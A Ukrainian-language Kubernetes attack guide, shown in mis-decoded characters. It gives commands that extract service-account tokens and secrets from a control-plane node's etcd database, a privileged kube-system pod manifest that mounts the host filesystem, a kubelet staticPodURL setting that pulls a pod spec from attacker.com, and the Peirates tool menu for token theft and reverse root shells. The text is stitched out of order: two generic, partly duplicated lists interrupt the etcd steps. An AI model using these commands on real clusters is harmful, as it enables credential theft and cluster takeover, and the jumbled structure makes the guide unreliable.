–Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–ø—É—Å—Ç–∏—Ç–∏ —Å–≤—ñ–π –ø–æ–¥ –Ω–∞ –≤—É–∑–ª—ñ control-plane, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Å–µ–ª–µ–∫—Ç–æ—Ä `nodeName` –≤ —Å–ø–µ—Ü–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –ø–æ–¥–∞, –≤–∏ –º–æ–∂–µ—Ç–µ –ª–µ–≥–∫–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö `etcd`, —è–∫–∞ –º—ñ—Å—Ç–∏—Ç—å –≤—Å—é –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é –∫–ª–∞—Å—Ç–µ—Ä–∞, –≤–∫–ª—é—á–∞—é—á–∏ –≤—Å—ñ —Å–µ–∫—Ä–µ—Ç–∏.

–ù–∏–∂—á–µ –Ω–∞–≤–µ–¥–µ–Ω–æ —à–≤–∏–¥–∫–∏–π —ñ –Ω–µ—á–µ—Å–Ω–∏–π —Å–ø–æ—Å—ñ–± –≤–∏—Ç—è–≥—Ç–∏ —Å–µ–∫—Ä–µ—Ç–∏ –∑ `etcd`, —è–∫—â–æ –≤—ñ–Ω –ø—Ä–∞—Ü—é—î –Ω–∞ –≤—É–∑–ª—ñ control-plane, –Ω–∞ —è–∫–æ–º—É –≤–∏ –∑–Ω–∞—Ö–æ–¥–∏—Ç–µ—Å—å. –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –±—ñ–ª—å—à –µ–ª–µ–≥–∞–Ω—Ç–Ω–µ —Ä—ñ—à–µ–Ω–Ω—è, —è–∫–µ –∑–∞–ø—É—Å–∫–∞—î –ø–æ–¥ –∑ —É—Ç–∏–ª—ñ—Ç–æ—é –∫–ª—ñ—î–Ω—Ç–∞ `etcd` `etcdctl` —Ç–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –≤—É–∑–ª–∞ control-plane –¥–ª—è –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –¥–æ etcd, –¥–µ –± –≤—ñ–Ω –Ω–µ –∑–∞–ø—É—Å–∫–∞–≤—Å—è, –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ [—Ü–µ–π –ø—Ä–∏–∫–ª–∞–¥–Ω–∏–π —Ñ–∞–π–ª](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml) –≤—ñ–¥ @mauilion.

**–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –ø—Ä–∞—Ü—é—î `etcd` –Ω–∞ –≤—É–∑–ª—ñ control-plane —Ç–∞ –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ, –¥–µ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –±–∞–∑–∞ –¥–∞–Ω–∏—Ö (—Ü–µ –Ω–∞ –∫–ª–∞—Å—Ç–µ—Ä—ñ, —Å—Ç–≤–æ—Ä–µ–Ω–æ–º—É –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `kubeadm`)**

```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```

### –ê—Ç–∞–∫–∞ Kubernetes –∑—Å–µ—Ä–µ–¥–∏–Ω–∏ Pod

–Ø–∫—â–æ –≤–∏ –æ—Ç—Ä–∏–º–∞–ª–∏ –¥–æ—Å—Ç—É–ø –¥–æ Pod –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–ª–∞—Å—Ç–µ—Ä–∞ Kubernetes, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω—ñ –¥—ñ—ó:

1. **–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è Service Account Token**: –í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ —Ç–æ–∫–µ–Ω –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏, —è–∫–∏–π –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –º–æ–Ω—Ç—É—î—Ç—å—Å—è –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ Pod, —â–æ–± –≤–∑–∞—î–º–æ–¥—ñ—è—Ç–∏ –∑ API —Å–µ—Ä–≤–µ—Ä–æ–º Kubernetes.
2. **–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è Kubernetes API**: –í–∏ –º–æ–∂–µ—Ç–µ –≤–∑–∞—î–º–æ–¥—ñ—è—Ç–∏ –∑ API —Å–µ—Ä–≤–µ—Ä–æ–º Kubernetes, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏, —Ç–∞–∫—ñ —è–∫ `client-go`, —è–∫—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ñ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ Pod.
3. **–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è kubectl**: –Ø–∫—â–æ –≤ Pod —î –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–π `kubectl`, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –π–æ–≥–æ –¥–ª—è –≤–∑–∞—î–º–æ–¥—ñ—ó –∑ –∫–ª–∞—Å—Ç–µ—Ä–æ–º Kubernetes.
4. **–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è Volume Mounts**: –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –º–æ–Ω—Ç—É—î—Ç—å—Å—è —è–∫–∏–π-–Ω–µ–±—É–¥—å Volume, —è–∫–∏–π –º—ñ—Å—Ç–∏—Ç—å –∫–æ–Ω—Ñ—ñ–¥–µ–Ω—Ü—ñ–π–Ω—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é, —Ç–∞–∫—É —è–∫ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω—ñ —Ñ–∞–π–ª–∏ –∞–±–æ –∫–ª—é—á—ñ.
5. **–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è Sidecar Containers**: –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å Sidecar –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—ñ–≤ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ Pod, —è–∫—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è –∞—Ç–∞–∫–∏ –Ω–∞ –∫–ª–∞—Å—Ç–µ—Ä Kubernetes.
6. **–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è Environment Variables**: –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ —î –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ñ –∑–º—ñ–Ω–Ω—ñ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞, —è–∫—ñ –º–æ–∂—É—Ç—å –º—ñ—Å—Ç–∏—Ç–∏ –∫–æ–Ω—Ñ—ñ–¥–µ–Ω—Ü—ñ–π–Ω—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é, —Ç–∞–∫—É —è–∫ –ø–∞—Ä–æ–ª—ñ –∞–±–æ –∫–ª—é—á—ñ API.
7. **–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è Network Policies**: –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –º–µ—Ä–µ–∂–µ–≤–∏—Ö –ø–æ–ª—ñ—Ç–∏–∫, —è–∫—ñ –º–æ–∂—É—Ç—å –æ–±–º–µ–∂—É–≤–∞—Ç–∏ –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—é –º—ñ–∂ Pod –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–ª–∞—Å—Ç–µ—Ä–∞ Kubernetes.
8. **–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è Privileged Containers**: –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ —î –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω—ñ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ Pod, —è–∫—ñ –º–æ–∂—É—Ç—å –º–∞—Ç–∏ —Ä–æ–∑—à–∏—Ä–µ–Ω—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó –¥–æ—Å—Ç—É–ø—É –¥–æ –∫–ª–∞—Å—Ç–µ—Ä–∞ Kubernetes.

```bash
data-dir=/var/lib/etcd
```

**–ü–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏ –¥–∞–Ω—ñ –≤ –±–∞–∑—ñ –¥–∞–Ω–∏—Ö etcd:**

```bash
strings /var/lib/etcd/member/snap/db | less
```

**–í–∏—Ç—è–≥–Ω—ñ—Ç—å —Ç–æ–∫–µ–Ω–∏ –∑ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö —Ç–∞ –ø–æ–∫–∞–∂—ñ—Ç—å —ñ–º'—è –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏**

```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```

**–¢–∞ –∂ –∫–æ–º–∞–Ω–¥–∞, –∞–ª–µ –∑ –¥–µ—è–∫–∏–º–∏ greps, —â–æ–± –ø–æ–≤–µ—Ä–Ω—É—Ç–∏ –ª–∏—à–µ —Ç–∏–ø–æ–≤–∏–π —Ç–æ–∫–µ–Ω —É –ø—Ä–æ—Å—Ç–æ—Ä—ñ —ñ–º–µ–Ω kube-system**

```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```

## –ê—Ç–∞–∫–∞ Kubernetes –∑—Å–µ—Ä–µ–¥–∏–Ω–∏ Pod

–Ø–∫—â–æ –≤–∏ –æ—Ç—Ä–∏–º–∞–ª–∏ –¥–æ—Å—Ç—É–ø –¥–æ Pod –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–ª–∞—Å—Ç–µ—Ä–∞ Kubernetes, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω—ñ –¥—ñ—ó:

1. **–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è Kubernetes API**: –í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Å–ª—É–∂–±–æ–≤—ñ –æ–±'—î–∫—Ç–∏ Kubernetes API –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ –∫–ª–∞—Å—Ç–µ—Ä, —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –Ω–æ–≤–∏—Ö –æ–±'—î–∫—Ç—ñ–≤ –∞–±–æ –Ω–∞–≤—ñ—Ç—å –≤–∏–¥–∞–ª–µ–Ω–Ω—è —ñ—Å–Ω—É—é—á–∏—Ö.
2. **–ó–ª–∞–º –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—ñ–≤**: –í–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–º–∞–≥–∞—Ç–∏—Å—è –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —ñ–Ω—à–∏—Ö –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—ñ–≤, —è–∫—ñ –ø—Ä–∞—Ü—é—é—Ç—å –≤ —Ç–æ–º—É –∂ Pod, –∞–±–æ –Ω–∞–≤—ñ—Ç—å –≤–∏–∫–æ–Ω–∞—Ç–∏ –∞—Ç–∞–∫—É –Ω–∞ —Å–∞–º –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä.
3. **–ó–ª–∞–º –≤—É–∑–ª—ñ–≤**: –í–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–º–∞–≥–∞—Ç–∏—Å—è –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –≤—É–∑–ª—ñ–≤ –∫–ª–∞—Å—Ç–µ—Ä–∞ Kubernetes, –Ω–∞ —è–∫–æ–º—É –ø—Ä–∞—Ü—é—î Pod, —ñ –≤–∏–∫–æ–Ω–∞—Ç–∏ –∞—Ç–∞–∫–∏ –Ω–∞ –Ω–∏—Ö.
4. **–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –º–µ—Ä–µ–∂—ñ**: –í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –º–µ—Ä–µ–∂–µ–≤—ñ –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ –¥–ª—è –∞—Ç–∞–∫ –Ω–∞ —ñ–Ω—à—ñ –æ–±'—î–∫—Ç–∏ –≤ –º–µ–∂–∞—Ö –∫–ª–∞—Å—Ç–µ—Ä–∞ –∞–±–æ –Ω–∞–≤—ñ—Ç—å –ø–æ–∑–∞ –Ω–∏–º.
5. **–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ä–µ—Å—É—Ä—Å—ñ–≤ –∫–ª–∞—Å—Ç–µ—Ä–∞**: –í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ä–µ—Å—É—Ä—Å–∏ –∫–ª–∞—Å—Ç–µ—Ä–∞ –¥–ª—è –≤–ª–∞—Å–Ω–∏—Ö —Ü—ñ–ª–µ–π, —Ç–∞–∫–∏—Ö —è–∫ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –æ–±—á–∏—Å–ª–µ–Ω—å –∞–±–æ –∑–±–µ—Ä—ñ–≥–∞–Ω–Ω—è –¥–∞–Ω–∏—Ö.

```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```

### –°—Ç–∞—Ç–∏—á–Ω–∞/–î–∑–µ—Ä–∫–∞–ª—å–Ω–∞ –ü–æ—Å—Ç—ñ–π–Ω—ñ—Å—Ç—å –ü–æ–¥—ñ–≤

_–°—Ç–∞—Ç–∏—á–Ω—ñ –ü–æ–¥–∏_ –∫–µ—Ä—É—é—Ç—å—Å—è –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –¥–µ–º–æ–Ω–æ–º kubelet –Ω–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–º—É –≤—É–∑–ª—ñ, –±–µ–∑ —Å–ø–æ—Å—Ç–µ—Ä–µ–∂–µ–Ω–Ω—è API-—Å–µ—Ä–≤–µ—Ä–∞ –∑–∞ –Ω–∏–º–∏. –ù–∞ –≤—ñ–¥–º—ñ–Ω—É –≤—ñ–¥ –ü–æ–¥—ñ–≤, —è–∫—ñ –∫–µ—Ä—É—é—Ç—å—Å—è –ø–ª–∞–Ω–æ–º —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –†–æ–∑–≥–æ—Ä—Ç–∞–Ω–Ω—è); –∑–∞–º—ñ—Å—Ç—å —Ü—å–æ–≥–æ, **kubelet —Å–ø–æ—Å—Ç–µ—Ä—ñ–≥–∞—î –∑–∞ –∫–æ–∂–Ω–∏–º —Å—Ç–∞—Ç–∏—á–Ω–∏–º –ü–æ–¥–æ–º** (—ñ –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞—î –π–æ–≥–æ —É —Ä–∞–∑—ñ –Ω–µ–≤–¥–∞—á—ñ).

–û—Ç–∂–µ, —Å—Ç–∞—Ç–∏—á–Ω—ñ –ü–æ–¥–∏ –∑–∞–≤–∂–¥–∏ **–ø—Ä–∏–≤'—è–∑–∞–Ω—ñ –¥–æ –æ–¥–Ω–æ–≥–æ Kubelet** –Ω–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–º—É –≤—É–∑–ª—ñ.

**Kubelet –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –Ω–∞–º–∞–≥–∞—î—Ç—å—Å—è —Å—Ç–≤–æ—Ä–∏—Ç–∏ –¥–∑–µ—Ä–∫–∞–ª—å–Ω–∏–π –ü–æ–¥ –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ API Kubernetes** –¥–ª—è –∫–æ–∂–Ω–æ–≥–æ —Å—Ç–∞—Ç–∏—á–Ω–æ–≥–æ –ü–æ–¥–∞. –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –ü–æ–¥–∏, —â–æ –ø—Ä–∞—Ü—é—é—Ç—å –Ω–∞ –≤—É–∑–ª—ñ, –≤–∏–¥–∏–º—ñ –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ API, –∞–ª–µ –Ω–µ –º–æ–∂—É—Ç—å –∫–µ—Ä—É–≤–∞—Ç–∏—Å—è –∑–≤—ñ–¥—Ç–∏. –Ü–º–µ–Ω–∞ –ü–æ–¥—ñ–≤ –±—É–¥—É—Ç—å —Å—É—Ñ—ñ–∫—Å–æ–≤–∞–Ω—ñ —ñ–º'—è–º —Ö–æ—Å—Ç–∞ –≤—É–∑–ª–∞ –∑ –ø–µ—Ä–µ–¥–Ω—ñ–º –¥–µ—Ñ—ñ—Å–æ–º.

{% hint style="danger" %}
**`spec` —Å—Ç–∞—Ç–∏—á–Ω–æ–≥–æ –ü–æ–¥–∞ –Ω–µ –º–æ–∂–µ –ø–æ—Å–∏–ª–∞—Ç–∏—Å—è –Ω–∞ —ñ–Ω—à—ñ –æ–±'—î–∫—Ç–∏ API** (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, ServiceAccount, ConfigMap, Secret —ñ —Ç.–¥. –¢–æ–º—É **–≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü—ñ—î—é –ø–æ–≤–µ–¥—ñ–Ω–∫–æ—é, —â–æ–± –∑–∞–ø—É—Å—Ç–∏—Ç–∏ –ü–æ–¥ –∑ –¥–æ–≤—ñ–ª—å–Ω–∏–º serviceAccount** –Ω–∞ –ø–æ—Ç–æ—á–Ω–æ–º—É –≤—É–∑–ª—ñ –¥–ª—è –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü—ñ—ó –∫–ª–∞—Å—Ç–µ—Ä–∞. –ê–ª–µ –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü–µ –¥–ª—è –∑–∞–ø—É—Å–∫—É –ü–æ–¥—ñ–≤ —É —Ä—ñ–∑–Ω–∏—Ö –ø—Ä–æ—Å—Ç–æ—Ä–∞—Ö —ñ–º–µ–Ω (—è–∫—â–æ —Ü–µ –∫–æ—Ä–∏—Å–Ω–æ –∑ —è–∫–æ—ó—Å—å –ø—Ä–∏—á–∏–Ω–∏).
{% endhint %}

–Ø–∫—â–æ –≤–∏ –∑–Ω–∞—Ö–æ–¥–∏—Ç–µ—Å—å –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ö–æ—Å—Ç–∞ –≤—É–∑–ª–∞, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–º—É—Å–∏—Ç–∏ –π–æ–≥–æ —Å—Ç–≤–æ—Ä–∏—Ç–∏ **—Å—Ç–∞—Ç–∏—á–Ω–∏–π –ü–æ–¥ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Å–µ–±–µ**. –¶–µ –¥–æ—Å–∏—Ç—å –∫–æ—Ä–∏—Å–Ω–æ, –æ—Å–∫—ñ–ª—å–∫–∏ —Ü–µ –º–æ–∂–µ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –≤–∞–º **—Å—Ç–≤–æ—Ä–∏—Ç–∏ –ü–æ–¥ —É —Ä—ñ–∑–Ω–æ–º—É –ø—Ä–æ—Å—Ç–æ—Ä—ñ —ñ–º–µ–Ω**, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, **kube-system**.

–î–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è —Å—Ç–∞—Ç–∏—á–Ω–æ–≥–æ –ü–æ–¥–∞, [**–¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—è –±—É–¥–µ –≤–µ–ª–∏–∫–æ—é –¥–æ–ø–æ–º–æ–≥–æ—é**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/). –í–∞–º –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É –ø–æ—Ç—Ä—ñ–±–Ω–æ 2 —Ä–µ—á—ñ:

* –ù–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä **`--pod-manifest-path=/etc/kubernetes/manifests`** —É **—Å–ª—É–∂–±—ñ kubelet**, –∞–±–æ –≤ **–∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó kubelet** ([**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)) —ñ –ø–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç–∏ —Å–ª—É–∂–±—É
* –°—Ç–≤–æ—Ä–∏—Ç–∏ –≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è –Ω–∞ **–≤–∏–∑–Ω–∞—á–µ–Ω–Ω—ñ –ü–æ–¥–∞** –≤ **`/etc/kubernetes/manifests`**

**–©–µ –æ–¥–∏–Ω –±—ñ–ª—å—à –ø—Ä–∏—Ö–æ–≤–∞–Ω–∏–π —Å–ø–æ—Å—ñ–± –±—É–¥–µ:**

* –ó–º—ñ–Ω–∏—Ç–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä **`staticPodURL`** —É —Ñ–∞–π–ª—ñ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó **kubelet** —ñ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ —â–æ—Å—å –Ω–∞ –∑—Ä–∞–∑–æ–∫ `staticPodURL: http://attacker.com:8765/pod.yaml`. –¶–µ –∑–º—É—Å–∏—Ç—å –ø—Ä–æ—Ü–µ—Å kubelet —Å—Ç–≤–æ—Ä–∏—Ç–∏ **—Å—Ç–∞—Ç–∏—á–Ω–∏–π –ü–æ–¥**, –æ—Ç—Ä–∏–º—É—é—á–∏ **–∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é –∑ –≤–∫–∞–∑–∞–Ω–æ–≥–æ URL**.

**–ü—Ä–∏–∫–ª–∞–¥** –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó **–ø–æ–¥–∞** –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–æ–≥–æ –ü–æ–¥–∞ –≤ **kube-system**, –≤–∑—è—Ç–∏–π –∑ [**—Ç—É—Ç**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/):

```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```

### –í–∏–¥–∞–ª–µ–Ω–Ω—è pods + –≤–∏–º–∫–Ω–µ–Ω–Ω—è nodes

–Ø–∫—â–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ **–∑–ª–∞–º–∞–≤ node** —ñ –º–æ–∂–µ **–≤–∏–¥–∞–ª—è—Ç–∏ pods** –∑ —ñ–Ω—à–∏—Ö nodes —ñ **–∑—Ä–æ–±–∏—Ç–∏ —ñ–Ω—à—ñ nodes –Ω–µ—Å–ø—Ä–æ–º–æ–∂–Ω–∏–º–∏ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ pods**, —Ç–æ pods –±—É–¥—É—Ç—å –ø–µ—Ä–µ–∑–∞–ø—É—â–µ–Ω—ñ –Ω–∞ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–æ–º—É node, —ñ –≤—ñ–Ω –∑–º–æ–∂–µ **–≤–∫—Ä–∞—Å—Ç–∏ —Ç–æ–∫–µ–Ω–∏**, —è–∫—ñ –≤ –Ω–∏—Ö –∑–∞–ø—É—â–µ–Ω—ñ.\
–î–ª—è [**–¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø–µ—Ä–µ–π–¥—ñ—Ç—å –∑–∞ —Ü–∏–º–∏ –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º–∏**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes).

## –ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)

```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```

* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

<details>

